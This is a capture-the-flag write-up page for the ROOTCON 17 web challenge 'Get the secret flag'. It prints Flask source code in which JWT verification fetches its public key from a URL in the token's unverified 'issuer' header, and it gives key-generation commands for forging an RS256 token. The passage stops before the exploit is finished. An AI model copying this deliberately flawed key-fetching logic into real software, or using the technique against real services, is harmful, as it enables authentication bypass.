<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
      
    <meta name="twitter:title" content="Get The Secret Flag">
    <meta name="twitter:description" content="Web 300 pts">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:image" content="https://altelus1.github.io/writeups/ctf/rootcon17finals/images/getthesecretflag_1.png" />
    
    <meta property="og:image" content="/writeups/ctf/rootcon17finals/images/getthesecretflag_1.png">
    <meta property="og:description" content="Web 300 pts">
    <title>Get The Secret Flag</title><!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Get The Secret Flag" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="http://localhost:4000/writeups/ctf/rootcon17finals/getthesecretflag.html" />
<meta property="og:url" content="http://localhost:4000/writeups/ctf/rootcon17finals/getthesecretflag.html" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Get The Secret Flag" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","headline":"Get The Secret Flag","url":"http://localhost:4000/writeups/ctf/rootcon17finals/getthesecretflag.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>


<body>
    <div class="container"><header>
  <div class="menu">
    <ul><li><a href="/">Home</a></li><li><a href="/about.html">About</a></li><li><a href="/writeups/">Writeups</a></li><li><a href="/projects/">Projects</a></li></ul>
  </div>
</header>
<main>
      <h1 id="web-get-the-secret-flag---300-pts">[Web] Get the secret flag - 300 Pts.</h1>
<p><br />
We’re given with these python source code and URL to http://149.28.150.153/<br /></p>

<h2 id="apppy-and-apipy-source-code-analysis">app.py and api.py source code analysis</h2>

<p>See the app.py below:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">Response</span>
<span class="kn">import</span> <span class="nn">secrets</span>
<span class="kn">from</span> <span class="nn">api</span> <span class="kn">import</span> <span class="n">api</span>
<span class="kn">from</span> <span class="nn">werkzeug.exceptions</span> <span class="kn">import</span> <span class="n">HTTPException</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">"."</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="n">token_bytes</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"jwks.json"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">jwks_file</span><span class="p">:</span>
    <span class="n">jwks_contents</span> <span class="o">=</span> <span class="n">jwks_file</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="n">app</span><span class="p">.</span><span class="n">register_blueprint</span><span class="p">(</span><span class="n">api</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">after_request</span> 
<span class="k">def</span> <span class="nf">after_request_callback</span><span class="p">(</span><span class="n">response</span><span class="p">:</span> <span class="n">Response</span><span class="p">):</span> 
    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">__dict__</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Content-Type"</span><span class="p">].</span><span class="n">startswith</span><span class="p">(</span><span class="s">"text/html"</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">response</span><span class="p">)</span>
        <span class="n">updated</span> <span class="o">=</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"template.html"</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">response</span><span class="p">.</span><span class="n">response</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"BBBBBBBBBBBBBBBB"</span><span class="p">)</span>
        <span class="n">response</span><span class="p">.</span><span class="n">set_data</span><span class="p">(</span><span class="n">updated</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="nb">Exception</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">handle_exception</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">HTTPException</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">e</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">500</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s">"path"</span><span class="p">:</span> <span class="s">""</span><span class="p">})</span>
<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/&lt;path:path&gt;"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"Hello World!"</span><span class="p">,</span> <span class="mi">200</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/login"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">return</span> <span class="s">"Not Implemented."</span><span class="p">,</span> <span class="mi">501</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/jwks.json"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">jwks</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">jwks_contents</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">}</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/logout"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">session</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
    <span class="n">redirect_uri</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'redirect'</span><span class="p">,</span> <span class="n">url_for</span><span class="p">(</span><span class="s">'home'</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">redirect_uri</span><span class="p">)</span>

</code></pre></div></div>
<p><br />See the api.py below:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">jwt</span><span class="p">,</span> <span class="n">requests</span>

<span class="n">api</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span>
    <span class="s">"api"</span><span class="p">,</span> <span class="n">__name__</span><span class="p">,</span>
    <span class="n">url_prefix</span><span class="o">=</span><span class="s">"/api"</span>
<span class="p">)</span>

<span class="n">valid_issuer</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">"HOST"</span><span class="p">)</span>
<span class="n">valid_alg</span> <span class="o">=</span> <span class="s">"RS256"</span>
<span class="n">valid_user</span> <span class="o">=</span> <span class="s">"motoh4ck3r"</span>

<span class="k">class</span> <span class="nc">AuthorizationError</span><span class="p">(</span><span class="nb">Exception</span><span class="p">):</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">is_valid_issuer</span><span class="p">(</span><span class="n">issuer</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">issuer</span><span class="p">).</span><span class="n">netloc</span> <span class="o">==</span> <span class="n">valid_issuer</span>

<span class="k">def</span> <span class="nf">get_public_key_url</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">get_unverified_header</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>

    <span class="k">if</span> <span class="s">"issuer"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT issuer is not configured."</span><span class="p">)</span>

    <span class="n">token_issuer</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s">"issuer"</span><span class="p">]</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_valid_issuer</span><span class="p">(</span><span class="n">token_issuer</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="sa">f</span><span class="s">"JWT issuer invalid. Should be: </span><span class="si">{</span><span class="n">valid_issuer</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

    <span class="k">return</span> <span class="s">"{host}/jwks.json"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">token_issuer</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_public_key</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">resp</span><span class="p">.</span><span class="n">raise_for_status</span><span class="p">()</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">resp</span><span class="p">[</span><span class="s">"keys"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">"x5c"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">except</span> <span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span><span class="p">,</span> <span class="nb">KeyError</span><span class="p">,</span> <span class="nb">IndexError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span>
            <span class="sa">f</span><span class="s">"Failed to fetch or prase public key from </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
        <span class="p">)</span> <span class="k">from</span> <span class="n">e</span>

<span class="k">def</span> <span class="nf">has_valid_alg</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">get_unverified_header</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
    <span class="n">alg</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s">"alg"</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">alg</span> <span class="o">==</span> <span class="n">valid_alg</span>

<span class="k">def</span> <span class="nf">authorize_request</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">pubkey_url</span> <span class="o">=</span> <span class="n">get_public_key_url</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">has_valid_alg</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT algorithm invalid."</span><span class="p">)</span>

    <span class="n">pubkey</span> <span class="o">=</span> <span class="n">get_public_key</span><span class="p">(</span><span class="n">pubkey_url</span><span class="p">)</span>
    <span class="n">pubkey</span> <span class="o">=</span> <span class="s">"-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s">{pubkey}</span><span class="se">\n</span><span class="s">-----END PUBLIC KEY-----"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">pubkey</span><span class="o">=</span><span class="n">pubkey</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pubkey</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="n">valid_alg</span><span class="p">])</span>
        <span class="k">if</span> <span class="s">"user"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">decoded_token</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT user is not configured."</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">decoded_token</span><span class="p">[</span><span class="s">"user"</span><span class="p">]</span> <span class="o">==</span> <span class="n">valid_user</span>
    <span class="k">except</span> <span class="n">jwt</span><span class="p">.</span><span class="n">ExpiredSignatureError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT signature has expired"</span><span class="p">)</span> <span class="k">from</span> <span class="n">e</span>
    <span class="k">except</span> <span class="n">jwt</span><span class="p">.</span><span class="n">DecodeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="sa">f</span><span class="s">"JWT validation failed: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span> <span class="k">from</span> <span class="n">e</span>

<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">before_request</span>
<span class="k">def</span> <span class="nf">authorize</span><span class="p">():</span>
    <span class="k">if</span> <span class="s">"Authorization"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"Authorization header not found."</span><span class="p">)</span>

    <span class="n">auth_header</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Authorization"</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">auth_header</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"Bearer token not found."</span><span class="p">)</span>

    <span class="n">token</span> <span class="o">=</span> <span class="n">auth_header</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">authorize_request</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"Authorization failed!"</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">flag_file</span><span class="p">:</span>
    <span class="n">secret_flag</span> <span class="o">=</span> <span class="n">flag_file</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>

<span class="o">@</span><span class="n">api</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/secret_flag"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">secret_flag</span>
                                 
</code></pre></div></div>
<p><br />Since we want a flag, we can go to the <code class="language-plaintext highlighter-rouge">/secret_flag</code> endpoint. However, we can see that that there’s an initial code to execute before executing the actual endpoint. <code class="language-plaintext highlighter-rouge">authorize()</code> is being called first.
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="k">def</span> <span class="nf">authorize</span><span class="p">():</span>
    <span class="k">if</span> <span class="s">"Authorization"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"Authorization header not found."</span><span class="p">)</span>

    <span class="n">auth_header</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Authorization"</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">auth_header</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"Bearer token not found."</span><span class="p">)</span>

    <span class="n">token</span> <span class="o">=</span> <span class="n">auth_header</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">authorize_request</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"Authorization failed!"</span><span class="p">)</span>

<span class="p">...</span>
</code></pre></div></div>
<p><br />We can see that there should be a <code class="language-plaintext highlighter-rouge">Authorization</code> header with token set to it. We can set our own JWT in there just to proceed with the code. The format would be <code class="language-plaintext highlighter-rouge">Authorization: Bearer &lt;our token&gt;</code>
<br />This should take us to <code class="language-plaintext highlighter-rouge">authorize_request(token)</code>. Let’s take a look at it.
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="k">def</span> <span class="nf">authorize_request</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">pubkey_url</span> <span class="o">=</span> <span class="n">get_public_key_url</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">has_valid_alg</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT algorithm invalid."</span><span class="p">)</span>

    <span class="n">pubkey</span> <span class="o">=</span> <span class="n">get_public_key</span><span class="p">(</span><span class="n">pubkey_url</span><span class="p">)</span>
    <span class="n">pubkey</span> <span class="o">=</span> <span class="s">"-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s">{pubkey}</span><span class="se">\n</span><span class="s">-----END PUBLIC KEY-----"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">pubkey</span><span class="o">=</span><span class="n">pubkey</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pubkey</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="n">valid_alg</span><span class="p">])</span>
        <span class="k">if</span> <span class="s">"user"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">decoded_token</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT user is not configured."</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">decoded_token</span><span class="p">[</span><span class="s">"user"</span><span class="p">]</span> <span class="o">==</span> <span class="n">valid_user</span>
    <span class="k">except</span> <span class="n">jwt</span><span class="p">.</span><span class="n">ExpiredSignatureError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT signature has expired"</span><span class="p">)</span> <span class="k">from</span> <span class="n">e</span>
    <span class="k">except</span> <span class="n">jwt</span><span class="p">.</span><span class="n">DecodeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="sa">f</span><span class="s">"JWT validation failed: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span> <span class="k">from</span> <span class="n">e</span>
<span class="p">...</span>
</code></pre></div></div>
<p><br />We can see we bumped into <code class="language-plaintext highlighter-rouge">get_public_key_url()</code>. As the function name says, it just retrieves a URL from the token we submitted. If it successfully retrieves a URL from the token, it gets the public key from that URL. and then uses it to decodethe JWT we have submitted.
<br />Let’s jump first to <code class="language-plaintext highlighter-rouge">get_public_key_url()</code> to see how it gets the URL:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="k">def</span> <span class="nf">get_public_key_url</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">get_unverified_header</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>

    <span class="k">if</span> <span class="s">"issuer"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="s">"JWT issuer is not configured."</span><span class="p">)</span>

    <span class="n">token_issuer</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s">"issuer"</span><span class="p">]</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_valid_issuer</span><span class="p">(</span><span class="n">token_issuer</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span><span class="sa">f</span><span class="s">"JWT issuer invalid. Should be: </span><span class="si">{</span><span class="n">valid_issuer</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

    <span class="k">return</span> <span class="s">"{host}/jwks.json"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">token_issuer</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>
<p><br />It’s noticeable that it tries to get the header of our JWT string once we create it and the header should contain <code class="language-plaintext highlighter-rouge">issuer</code> key and some value. Goind further, we can see that the URL it tries to build is the <code class="language-plaintext highlighter-rouge">issue</code> value with <code class="language-plaintext highlighter-rouge">jwks.json</code> as the path. So for example if we have a host of “http://sample-host.com” it will build the final URL build “http://sample-host.com/jwks.json”
<br />Remember also that the host also has <code class="language-plaintext highlighter-rouge">jwks.json</code> from the <code class="language-plaintext highlighter-rouge">app.py</code>. We can retrieve the contents and the content is:
<br /></p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"x5c"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqwbbx3Ih7YDR+GB9kX+3</span><span class="se">\n</span><span class="s2">Z/MXkVyj0Bs+E1rCph3XyAEDzft5SgK/xq4SHO48RKl+M17eJirDOnWVvHqnjxyC</span><span class="se">\n</span><span class="s2">ig2Ha/mP+liUBPxaNRPbJbXpn9pmbYLR/7LIUvKizL9fYdYyQnACLI1OdAD/PKLjQ</span><span class="se">\n</span><span class="s2">IAUGi6a8L37VQOjmf6ooLOSwKdNq/aM4eFpciKNZ3gO0YMc6SC17Jt/0L9aegxqt</span><span class="se">\n</span><span class="s2">VwEXQou1/yisLuzEY6LmKEbTXuX9oSVFzd/FXi2xsLrD4nqI/HAiRoYnK1gAeglw</span><span class="se">\n</span><span class="s2">F23h8Hc8jYoXgdZowt1+/XuDPfHKsP6f0MddLlDaJAML2Ab6fJk3B1YkcrAZap4Zzu</span><span class="se">\n</span><span class="s2">AQIDAQAB"</span><span class="w">
            </span><span class="p">]</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p><br />Let’s go back up again see next the <code class="language-plaintext highlighter-rouge">has_valid_algorithm()</code>:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="n">valid_alg</span> <span class="o">=</span> <span class="s">"RS256"</span>
<span class="p">...</span>
<span class="k">def</span> <span class="nf">has_valid_alg</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">get_unverified_header</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
    <span class="n">alg</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="s">"alg"</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">alg</span> <span class="o">==</span> <span class="n">valid_alg</span>
<span class="p">...</span>
</code></pre></div></div>
<p><br />It just checks if the algorithm used in the provided JWT string is “RS256”. So we need to create an RS256 JWT. A private key and public key is needed to create RS256 JWT. Below commands can be used:
<br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096 <span class="nt">-m</span> PEM <span class="nt">-f</span> jwtRS256.key
: <span class="o">&lt;&lt;</span> <span class="no">COMMENT</span><span class="sh">
Generating public/private rsa key pair.

Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in jwtRS256.key
Your public key has been saved in jwtRS256.key.pub
The key fingerprint is:
SHA256:VLL6D8WiVQpwufNe1+EXhj7pAyfowG4AZxmcLoYZNXM kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|  .+oEo.. .      |
| .  +*.  +       |
|  + . +.o .   .  |
| o + =o+ +   ..o |
|  . = ooS + .oo..|
|     . *.+.o.=o .|
|      +.=. .= .. |
|       o.+   o   |
|      .   .   .  |
+----[SHA256]-----+
</span><span class="no">COMMENT
</span>openssl rsa <span class="nt">-in</span> jwtRS256.key <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM <span class="nt">-out</span> jwtRS256.key.pub

</code></pre></div></div>
<p><br />We can use <a href="https://jwt.io/">https://jwt.io/</a> and the jwtRS256 keys for the contruction of JWT.
<br /><img src="images/getthesecretflag_2.png" alt="lol it didn't load" />
<br />We’re ready to form our JWT. Let’s go back up again see next the <code class="language-plaintext highlighter-rouge">get_public_key()</code>:
<br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="k">def</span> <span class="nf">get_public_key</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">resp</span><span class="p">.</span><span class="n">raise_for_status</span><span class="p">()</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">resp</span><span class="p">[</span><span class="s">"keys"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">"x5c"</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">except</span> <span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span><span class="p">,</span> <span class="nb">KeyError</span><span class="p">,</span> <span class="nb">IndexError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">AuthorizationError</span><span class="p">(</span>
            <span class="sa">f</span><span class="s">"Failed to fetch or prase public key from </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
        <span class="p">)</span> <span class="k">from</span> <span class="n">e</span>
<span class="p">...</span>
</code></pre></div></div>
